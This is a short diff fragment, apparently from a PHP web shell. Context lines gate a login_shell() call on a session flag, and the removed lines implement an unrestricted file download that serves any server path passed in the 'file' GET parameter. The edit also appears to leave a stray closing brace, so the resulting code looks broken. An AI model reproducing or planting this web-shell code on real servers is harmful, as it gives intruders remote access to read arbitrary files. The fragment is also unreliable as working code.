@@ -71,17 +71,5 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     else
         login_shell();
-if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-    @ob_clean();
-    $file = $_GET['file'];
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($file).'"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($file));
-    readfile($file);
-    exit;
 }
 ?>
